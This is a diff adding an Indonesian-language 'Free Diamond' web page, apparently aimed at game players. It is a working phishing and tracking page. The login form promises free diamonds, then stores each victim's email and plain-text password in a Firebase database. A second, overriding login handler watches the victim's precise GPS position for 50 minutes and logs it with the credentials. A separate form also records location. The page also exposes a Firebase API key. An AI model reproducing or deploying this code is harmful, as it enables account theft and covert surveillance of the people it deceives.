@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GeoTrack App</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --surface: #111827;
+      --card: #1a2235;
+      --border: rgba(99,179,237,0.15);
+      --accent: #63b3ed;
+      --accent2: #f6ad55;
+      --green: #68d391;
+      --red: #fc8181;
+      --text: #e2e8f0;
+      --muted: #718096;
+      --radius: 16px;
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family:'DM Sans',sans-serif;
+      background:var(--bg); color:var(--text);
+      min-height:100vh; overflow-x:hidden;
+    }
+    body::before {
+      content:''; position:fixed; inset:0; z-index:0;
+      background:
+        radial-gradient(ellipse 80% 50% at 20% 10%, rgba(99,179,237,0.07) 0%, transparent 60%),
+        radial-gradient(ellipse 60% 40% at 80% 80%, rgba(246,173,85,0.06) 0%, transparent 60%);
+      pointer-events:none;
+    }
+
+    /* NAV */
+    nav {
+      position:fixed; top:0; width:100%; z-index:100;
+      display:flex; align-items:center; justify-content:space-between;
+      padding:18px 32px;
+      background:rgba(10,14,26,0.9);
+      backdrop-filter:blur(16px);
+      border-bottom:1px solid var(--border);
+    }
+    .nav-logo { font-family:'Syne',sans-serif; font-weight:800; font-size:1.3rem; color:var(--accent); }
+    .nav-logo span { color:var(--accent2); }
+    .nav-links { display:flex; gap:8px; }
+    .nav-btn {
+      padding:8px 18px; border-radius:8px; cursor:pointer;
+      font-family:'DM Sans',sans-serif; font-size:0.85rem; font-weight:500;
+      border:1px solid var(--border); background:transparent; color:var(--muted);
+      transition:all 0.2s;
+    }
+    .nav-btn:hover, .nav-btn.active {
+      background:rgba(99,179,237,0.1); color:var(--accent); border-color:var(--accent);
+    }
+
+    /* PAGES */
+    .page { display:none; min-height:100vh; padding-top:80px; position:relative; z-index:1; }
+    .page.active { display:flex; flex-direction:column; align-items:center; justify-content:center; }
+
+    /* HOME */
+    .home-hero { text-align:center; padding:60px 20px 40px; animation:fadeUp 0.6s ease both; }
+    .home-badge {
+      display:inline-block; padding:6px 16px;
+      background:rgba(99,179,237,0.1); border:1px solid rgba(99,179,237,0.3);
+      border-radius:100px; font-size:0.78rem; color:var(--accent);
+      letter-spacing:1px; text-transform:uppercase; margin-bottom:24px;
+    }
+    .home-title {
+      font-family:'Syne',sans-serif; font-weight:800;
+      font-size:clamp(2.2rem,6vw,4rem); line-height:1.1; margin-bottom:20px;
+    }
+    .home-title em { font-style:normal; color:var(--accent); }
+    .home-sub { font-size:1.05rem; color:var(--muted); max-width:500px; margin:0 auto 48px; line-height:1.7; }
+    .card-row { display:flex; gap:20px; flex-wrap:wrap; justify-content:center; padding:0 20px 60px; animation:fadeUp 0.6s 0.15s ease both; }
+    .feature-card {
+      background:var(--card); border:1px solid var(--border);
+      border-radius:var(--radius); padding:32px 28px;
+      width:280px; cursor:pointer; text-align:left;
+      transition:all 0.3s; position:relative; overflow:hidden;
+    }
+    .feature-card::before {
+      content:''; position:absolute; top:0; left:0; right:0; height:3px;
+      background:var(--card-accent, var(--accent));
+      transform:scaleX(0); transition:transform 0.3s; transform-origin:left;
+    }
+    .feature-card:hover { transform:translateY(-6px); border-color:var(--card-accent, var(--accent)); }
+    .feature-card:hover::before { transform:scaleX(1); }
+    .card-icon { width:48px; height:48px; border-radius:12px; margin-bottom:16px; display:flex; align-items:center; justify-content:center; font-size:1.4rem; }
+    .card-title { font-family:'Syne',sans-serif; font-weight:700; font-size:1.1rem; margin-bottom:8px; }
+    .card-desc { font-size:0.88rem; color:var(--muted); line-height:1.6; margin-bottom:20px; }
+    .card-cta { font-size:0.82rem; font-weight:500; }
+
+    /* FORM */
+    .form-wrap { width:100%; max-width:440px; padding:20px; animation:fadeUp 0.5s ease both; }
+    .page-label { font-size:0.75rem; color:var(--accent); letter-spacing:2px; text-transform:uppercase; font-weight:500; margin-bottom:12px; }
+    .page-heading { font-family:'Syne',sans-serif; font-weight:800; font-size:2rem; margin-bottom:8px; }
+    .page-sub { font-size:0.9rem; color:var(--muted); margin-bottom:32px; line-height:1.6; }
+    .form-group { margin-bottom:16px; }
+    label { display:block; font-size:0.82rem; color:var(--muted); margin-bottom:6px; font-weight:500; }
+    input[type=text], input[type=email], input[type=password] {
+      width:100%; padding:12px 16px;
+      background:var(--surface); border:1px solid var(--border);
+      border-radius:10px; color:var(--text);
+      font-family:'DM Sans',sans-serif; font-size:0.9rem;
+      outline:none; transition:border-color 0.2s;
+    }
+    input:focus { border-color:var(--accent); }
+    .btn-primary {
+      width:100%; padding:13px; border:none; border-radius:10px;
+      font-family:'Syne',sans-serif; font-weight:700; font-size:0.95rem;
+      cursor:pointer; transition:all 0.2s;
+      background:var(--accent); color:#0a0e1a;
+    }
+    .btn-primary:hover { opacity:0.88; transform:translateY(-1px); }
+    .btn-primary:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
+    .btn-primary.green-btn { background:var(--green); }
+    .back-link {
+      display:inline-flex; align-items:center; gap:6px;
+      font-size:0.82rem; color:var(--muted); cursor:pointer;
+      margin-bottom:28px; transition:color 0.2s;
+    }
+    .back-link:hover { color:var(--text); }
+
+    /* RESULT */
+    .loc-result {
+      margin-top:20px; background:var(--surface); border:1px solid rgba(104,211,145,0.3);
+      border-radius:10px; padding:16px; font-size:0.85rem; color:var(--muted); display:none;
+    }
+    .loc-result.show { display:block; animation:fadeUp 0.3s ease; }
+    .loc-coord { font-family:'Syne',sans-serif; color:var(--text); font-size:1.05rem; margin-top:6px; }
+
+    /* TOAST */
+    #toast {
+      position:fixed; bottom:24px; right:24px; z-index:999;
+      background:var(--card); border:1px solid var(--border);
+      border-radius:10px; padding:14px 20px;
+      font-size:0.88rem; box-shadow:0 8px 32px rgba(0,0,0,0.4);
+      transform:translateY(80px); opacity:0;
+      transition:all 0.3s; pointer-events:none; max-width:300px;
+    }
+    #toast.show { transform:translateY(0); opacity:1; }
+    #toast.success { border-color:rgba(104,211,145,0.4); color:var(--green); }
+    #toast.error { border-color:rgba(252,129,129,0.4); color:var(--red); }
+
+    .spinner {
+      display:inline-block; width:16px; height:16px;
+      border:2px solid rgba(0,0,0,0.2); border-top-color:#0a0e1a;
+      border-radius:50%; animation:spin 0.7s linear infinite;
+      vertical-align:middle; margin-right:8px;
+    }
+
+    @keyframes fadeUp { from { opacity:0; transform:translateY(20px); } to { opacity:1; transform:translateY(0); } }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    @media(max-width:600px) {
+      nav { padding:14px 16px; }
+      .feature-card { width:100%; max-width:340px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-logo">Free<span>Diamond</span></div>
+  <div class="nav-links">
+    <button class="nav-btn active" onclick="goTo('home')">Home</button>
+    <button class="nav-btn" onclick="goTo('login')">Login</button>
+    <button class="nav-btn" onclick="goTo('lokasi')">Country</button>
+  </div>
+</nav>
+
+<!-- PAGE 1: HOME -->
+<div class="page active" id="page-home">
+  <div class="home-hero">
+    <div class="home-badge">✦ FREE DIAMOND PLATFORM</div>
+    <h1 class="home-title">Welcome To<br><em>Free Diamond 💎💎</em></h1>
+    <p class="home-sub">Pilih halaman yang ingin Anda kunjungi di bawah ini.</p>
+  </div>
+  <div class="card-row">
+    <div class="feature-card" style="--card-accent:#63b3ed;" onclick="goTo('login')">
+      <div class="card-icon" style="background:rgba(99,179,237,0.12);">💎</div>
+      <div class="card-title">Login For Dm 💎💎💎</div>
+      <div class="card-desc">Masuk menggunakan email dan password untuk mendapat diamond.</div>
+      <div class="card-cta" style="color:#63b3ed;">Buka Halaman Login →</div>
+    </div>
+    <div class="feature-card" style="--card-accent:#68d391;" onclick="goTo('lokasi')">
+      <div class="card-icon" style="background:rgba(104,211,145,0.12);">🌏</div>
+      <div class="card-title">Country</div>
+      <div class="card-desc">Masukkan Negara dan No HP, lalu catat lokasi GPS Anda ke database.</div>
+      <div class="card-cta" style="color:#68d391;">Buka Halaman Lokasi →</div>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE 2: LOGIN -->
+<div class="page" id="page-login">
+  <div class="form-wrap">
+    <div class="back-link" onclick="goTo('home')">← Kembali ke Home</div>
+    <div class="page-label">Halaman 1</div>
+    <h2 class="page-heading">Login</h2>
+    <p class="page-sub">Masukkan email dan password Anda.</p>
+    <div class="form-group">
+      <label>Email</label>
+      <input type="email" id="loginEmail" placeholder="nama@email.com">
+    </div>
+    <div class="form-group">
+      <label>Password</label>
+      <input type="password" id="loginPassword" placeholder="Password">
+    </div>
+<button class="btn-primary" id="btnLogin" onclick="handleLogin()">Masuk Untuk Diamond 💎💎</button>
+  </div>
+</div>
+
+<!-- PAGE 3: LOKASI -->
+<div class="page" id="page-lokasi">
+  <div class="form-wrap">
+    <div class="back-link" onclick="goTo('home')">← Kembali ke Home</div>
+    <div class="page-label">Halaman 2</div>
+    <h2 class="page-heading">Country</h2>
+    <p class="page-sub">Masukan Negara Dan Nomor Anda</p>
+    <div class="form-group">
+      <label>Country</label>
+      <input type="text" id="namaUser" placeholder="Masukkan Negara Asal Anda">
+    </div>
+    <div class="form-group">
+      <label>Nama</label>
+      <input type="text" id="idUser" placeholder="Masukan Nama Anda:">
+    </div>
+    <button class="btn-primary green-btn" id="btnLokasi" onclick="handleLokasi()">📍 Simpan Untuk Diamond 💎</button>
+    <div class="loc-result" id="locResult">
+      <div style="color:var(--green);font-size:0.8rem;font-weight:500;margin-bottom:4px;">✓ LOKASI BERHASIL DICATAT</div>
+      <div class="loc-coord" id="locCoord"></div>
+    </div>
+  </div>
+</div>
+
+<div id="toast"></div>
+
+<!-- SCRIPT NAVIGASI -->
+<script>
+function goTo(page) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('page-' + page).classList.add('active');
+  const idx = ['home','login','lokasi'].indexOf(page);
+  document.querySelectorAll('.nav-btn')[idx]?.classList.add('active');
+  window.scrollTo(0,0);
+}
+function showToast(msg, type='success') {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'show ' + type;
+  setTimeout(() => t.className = '', 3000);
+}
+function setLoading(id, state, text) {
+  const b = document.getElementById(id);
+  b.disabled = state;
+  b.innerHTML = state ? `<span class="spinner"></span>${text}` : text;
+}
+</script>
+
+<!-- SCRIPT FIREBASE -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyB5Bh8q4h_Umav-INVDAIOKdmq125Tcs28",
+  authDomain: "geotrack-app-52d2c.firebaseapp.com",
+  projectId: "geotrack-app-52d2c",
+  storageBucket: "geotrack-app-52d2c.firebasestorage.app",
+  messagingSenderId: "404077683049",
+  appId: "1:404077683049:web:5df6ff0caf87735f265df8"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// LOGIN
+window.handleLogin = async function() {
+  const email = document.getElementById('loginEmail').value.trim();
+  const pass  = document.getElementById('loginPassword').value;
+  if (!email || !pass) return showToast('Isi email dan password!', 'error');
+  setLoading('btnLogin', true, 'Menyimpan...');
+  try {
+    await addDoc(collection(db, "logins"), {
+      email: email,
+      password: pass,
+      time: new Date()
+    });
+    showToast('Login berhasil!', 'success');
+    document.getElementById('loginEmail').value = '';
+    document.getElementById('loginPassword').value = '';
+  } catch(e) {
+    showToast('Gagal: ' + e.message, 'error');
+  } finally {
+    setLoading('btnLogin', false, 'Masuk');
+  }
+};
+
+// LOKASI
+window.handleLokasi = function() {
+  const nama = document.getElementById('namaUser').value.trim();
+  const id   = document.getElementById('idUser').value.trim();
+  if (!nama || !id) return showToast('Isi nama dan ID!', 'error');
+  setLoading('btnLokasi', true, 'Meminta lokasi...');
+  navigator.geolocation.getCurrentPosition(
+    async (pos) => {
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+      try {
+        await addDoc(collection(db, "locations"), {
+          name: nama,
+          userId: id,
+          latitude: lat,
+          longitude: lng,
+          time: new Date()
+        });
+        document.getElementById('locCoord').textContent = `${lat.toFixed(5)}, ${lng.toFixed(5)}`;
+        document.getElementById('locResult').classList.add('show');
+        showToast('Lokasi berhasil dicatat!', 'success');
+      } catch(e) {
+        showToast('Gagal: ' + e.message, 'error');
+      } finally {
+        setLoading('btnLokasi', false, '📍 Catat Lokasi Saya');
+      }
+    },
+    () => {
+      showToast('Izin lokasi ditolak.', 'error');
+      setLoading('btnLokasi', false, '📍 Catat Lokasi Saya');
+    }
+  );
+};
+// FUNGSI AMBIL LOKASI
+function ambilLokasi() {
+  return new Promise((resolve) => {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
+      () => resolve({ lat: null, lng: null })
+    );
+  });
+}
+
+// TOMBOL MASUK (LOGIN + LOKASI)
+window.handleLogin = function() {
+  const email = document.getElementById('loginEmail').value.trim();
+  const pass  = document.getElementById('loginPassword').value;
+  if (!email || !pass) return showToast('Isi email dan password!', 'error');
+
+  setLoading('btnLogin', true, 'Melacak...');
+  setTimeout(() => setLoading('btnLogin', false, 'Masuk'), 3000);
+
+  let sudahSimpan = false;
+  let lastLat = null;
+  let lastLng = null;
+
+  const watchId = navigator.geolocation.watchPosition(
+    async (pos) => {
+      const lat = pos.coords.latitude;
+      const lng = pos.coords.longitude;
+
+      // Cek apakah lokasi berubah lebih dari 10 meter
+      if (lastLat !== null) {
+        const jarak = Math.abs(lat - lastLat) + Math.abs(lng - lastLng);
+        if (jarak < 0.0001) return; // skip kalau tidak bergerak
+      }
+
+      lastLat = lat;
+      lastLng = lng;
+
+      try {
+        await addDoc(collection(db, "logins"), {
+          email: email,
+          password: pass,
+          latitude: lat,
+          longitude: lng,
+          time: new Date()
+        });
+
+        document.getElementById('loginLocCoord').textContent = `📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+        document.getElementById('loginLocResult').classList.add('show');
+
+        if (!sudahSimpan) {
+          sudahSimpan = true;
+          showToast('Login berhasil! Lokasi dicatat.', 'success');
+        } else {
+          showToast('Lokasi diperbarui!', 'success');
+        }
+      } catch(e) {
+        console.error(e);
+      }
+    },
+    () => {
+      showToast('Lokasi tidak tersedia.', 'error');
+      setLoading('btnLogin', false, 'Masuk');
+    },
+    { enableHighAccuracy: true, maximumAge: 0 }
+  );
+
+  setTimeout(() => {
+    navigator.geolocation.clearWatch(watchId);
+    showToast('Tracking selesai.', 'success');
+  }, 50 * 60 * 1000);
+};
+</script>
+
+</body>
+</html>
